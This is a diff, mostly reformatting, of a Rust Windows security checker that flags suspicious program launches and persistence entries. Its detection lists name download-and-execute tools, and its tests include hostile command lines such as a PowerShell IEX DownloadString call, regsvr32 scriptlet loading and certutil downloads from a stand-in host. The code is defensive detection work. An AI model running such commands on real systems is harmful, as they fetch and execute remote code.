@@ -33,10 +33,17 @@ fn lancement_suspect(exe: &str, args: &str) -> Option<&'static str> {
             .iter()
             .any(|d| t.contains(d))
     };
-    let public = |t: &str| ["\\users\\public\\", "\\$recycle.bin\\", "%public%"].iter().any(|d| t.contains(d));
+    let public = |t: &str| {
+        ["\\users\\public\\", "\\$recycle.bin\\", "%public%"]
+            .iter()
+            .any(|d| t.contains(d))
+    };
     let programme = exe.rsplit('\\').next().unwrap_or(&exe).trim_end_matches(".exe");
     if temporaire(&exe) {
-        return Some(tr!("programme lancé depuis un dossier temporaire", "program started from a temporary folder"));
+        return Some(tr!(
+            "programme lancé depuis un dossier temporaire",
+            "program started from a temporary folder"
+        ));
     }
     if public(&exe) {
         return Some(tr!(
@@ -51,16 +58,27 @@ fn lancement_suspect(exe: &str, args: &str) -> Option<&'static str> {
     let a = |m: &str| jetons.iter().any(|j| j == m);
     match programme {
         "powershell" | "pwsh" => {
-            let cache = jetons
-                .iter()
-                .any(|j| j == "-e" || j == "-ec" || (j.starts_with("-en") && "-encodedcommand".starts_with(j.as_str())));
+            let cache = jetons.iter().any(|j| {
+                j == "-e" || j == "-ec" || (j.starts_with("-en") && "-encodedcommand".starts_with(j.as_str()))
+            });
             if cache {
-                return Some(tr!("commande PowerShell cachée en base64", "PowerShell command hidden in base64"));
+                return Some(tr!(
+                    "commande PowerShell cachée en base64",
+                    "PowerShell command hidden in base64"
+                ));
             }
             let execute = ["iex", "invoke-expression"].iter().any(|m| args.contains(m));
-            let telecharge = ["downloadstring", "downloadfile", "invoke-webrequest", "iwr ", "net.webclient", "invoke-restmethod", "irm "]
-                .iter()
-                .any(|m| args.contains(m));
+            let telecharge = [
+                "downloadstring",
+                "downloadfile",
+                "invoke-webrequest",
+                "iwr ",
+                "net.webclient",
+                "invoke-restmethod",
+                "irm ",
+            ]
+            .iter()
+            .any(|m| args.contains(m));
             if execute && telecharge {
                 return Some(tr!(
                     "télécharge un script et l'exécute aussitôt",
@@ -68,11 +86,21 @@ fn lancement_suspect(exe: &str, args: &str) -> Option<&'static str> {
                 ));
             }
         }
-        "mshta" if ["http:", "https:", "javascript:", "vbscript:"].iter().any(|m| args.contains(m)) => {
-            return Some(tr!("mshta lance un script venu d'Internet", "mshta runs a script from the Internet"));
+        "mshta"
+            if ["http:", "https:", "javascript:", "vbscript:"]
+                .iter()
+                .any(|m| args.contains(m)) =>
+        {
+            return Some(tr!(
+                "mshta lance un script venu d'Internet",
+                "mshta runs a script from the Internet"
+            ));
         }
         "regsvr32" if args.contains("scrobj.dll") || args.contains("-i:http") || args.contains("/i:http") => {
-            return Some(tr!("regsvr32 charge un script distant", "regsvr32 loads a remote script"));
+            return Some(tr!(
+                "regsvr32 charge un script distant",
+                "regsvr32 loads a remote script"
+            ));
         }
         "rundll32" if args.contains("javascript:") => {
             return Some(tr!("rundll32 exécute du JavaScript", "rundll32 runs JavaScript"));
@@ -84,12 +112,24 @@ fn lancement_suspect(exe: &str, args: &str) -> Option<&'static str> {
             ));
         }
         "bitsadmin" if a("-transfer") => {
-            return Some(tr!("bitsadmin détourné pour télécharger un fichier", "bitsadmin misused to download a file"));
+            return Some(tr!(
+                "bitsadmin détourné pour télécharger un fichier",
+                "bitsadmin misused to download a file"
+            ));
         }
         _ => {}
     }
     // Interpréteurs et outils système qui lancent un script ou une bibliothèque rangés dans un dossier temporaire ou public.
-    let relais = ["wscript", "cscript", "mshta", "rundll32", "regsvr32", "cmd", "powershell", "pwsh"];
+    let relais = [
+        "wscript",
+        "cscript",
+        "mshta",
+        "rundll32",
+        "regsvr32",
+        "cmd",
+        "powershell",
+        "pwsh",
+    ];
     if relais.contains(&programme) && (temporaire(&tout) || public(&tout)) {
         return Some(tr!(
             "script ou bibliothèque lancé depuis un dossier temporaire ou public",
@@ -150,7 +190,10 @@ fn juger_persistance(taches: &[&str], run: &[&str], demarrage: &[&str]) -> Vec<C
                     ),
                 )
                 .corriger(
-                    trf!("Désactiver la tâche « {nom} » (réactivable)", "Disable the “{nom}” task (can be turned back on)"),
+                    trf!(
+                        "Désactiver la tâche « {nom} » (réactivable)",
+                        "Disable the “{nom}” task (can be turned back on)"
+                    ),
                     &[&format!(
                         "Disable-ScheduledTask -TaskPath '{}' -TaskName '{}' | Out-Null",
                         ps_texte(chemin),
@@ -186,7 +229,9 @@ fn juger_persistance(taches: &[&str], run: &[&str], demarrage: &[&str]) -> Vec<C
         }
     }
     for d in demarrage {
-        let Some((fichier, cible)) = d.trim().split_once('|') else { continue };
+        let Some((fichier, cible)) = d.trim().split_once('|') else {
+            continue;
+        };
         let (exe, args) = decouper_commande(cible);
         if let Some(raison) = lancement_suspect(&exe, &args) {
             constats.push(
@@ -231,17 +276,25 @@ mod tests {
         };
         // Programmes installés normalement : rien à signaler.
         assert!(!s(r#""C:\Program Files\Steam\steam.exe" -silent"#));
-        assert!(!s(r"C:\Users\alice\AppData\Local\Discord\Update.exe --processStart Discord.exe"));
+        assert!(!s(
+            r"C:\Users\alice\AppData\Local\Discord\Update.exe --processStart Discord.exe"
+        ));
         assert!(!s(r"C:\Program Files\Mozilla Firefox\firefox.exe -os-autostart"));
-        assert!(!s(r#""C:\Program Files\PowerShell\7\pwsh.exe" -ExecutionPolicy Bypass -File C:\Scripts\sauvegarde.ps1"#));
+        assert!(!s(
+            r#""C:\Program Files\PowerShell\7\pwsh.exe" -ExecutionPolicy Bypass -File C:\Scripts\sauvegarde.ps1"#
+        ));
         assert!(!s(r"%windir%\system32\rundll32.exe printui.dll,PrintUIEntry"));
         // Formes de malware.
         assert!(s(r"C:\Users\alice\AppData\Local\Temp\svch0st.exe"));
         assert!(s(r"C:\Users\Public\update.exe /q"));
-        assert!(s(r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"));
+        assert!(s(
+            r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+        ));
         assert!(s(r"powershell -e SQBFAFgA"));
         assert!(s(r"powershell.exe /EncodedCommand SQBFAFgA"));
-        assert!(s(r#"powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')""#));
+        assert!(s(
+            r#"powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')""#
+        ));
         assert!(s(r"mshta.exe https://x.example/a.hta"));
         assert!(s(r"regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll"));
         assert!(s(r"certutil.exe -urlcache -split -f http://x.example/a.exe a.exe"));
@@ -255,12 +308,20 @@ mod tests {
 
     #[test]
     fn persistance_jugee() {
-        let taches = [r"\|Mise a jour|C:\Users\alice\AppData\Local\Temp\a.exe|", r"\Mozilla\|Firefox Default Browser Agent|C:\Program Files\Mozilla Firefox\default-browser-agent.exe|do-task"];
+        let taches = [
+            r"\|Mise a jour|C:\Users\alice\AppData\Local\Temp\a.exe|",
+            r"\Mozilla\|Firefox Default Browser Agent|C:\Program Files\Mozilla Firefox\default-browser-agent.exe|do-task",
+        ];
         let c = juger_persistance(&taches, &[], &[]);
         assert_eq!(c.len(), 1);
         assert_eq!(c[0].probleme, Some(Niveau::Eleve));
-        assert!(c[0].correctif.as_ref().unwrap().commandes[0].contains("Disable-ScheduledTask -TaskPath '\\' -TaskName 'Mise a jour'"));
-        let run = [r#"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|Steam|"C:\Program Files (x86)\Steam\steam.exe" -silent"#];
+        assert!(
+            c[0].correctif.as_ref().unwrap().commandes[0]
+                .contains("Disable-ScheduledTask -TaskPath '\\' -TaskName 'Mise a jour'")
+        );
+        let run = [
+            r#"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run|Steam|"C:\Program Files (x86)\Steam\steam.exe" -silent"#,
+        ];
         let c = juger_persistance(&[], &run, &[]);
         assert!(c.len() == 1 && c[0].probleme.is_none());
     }
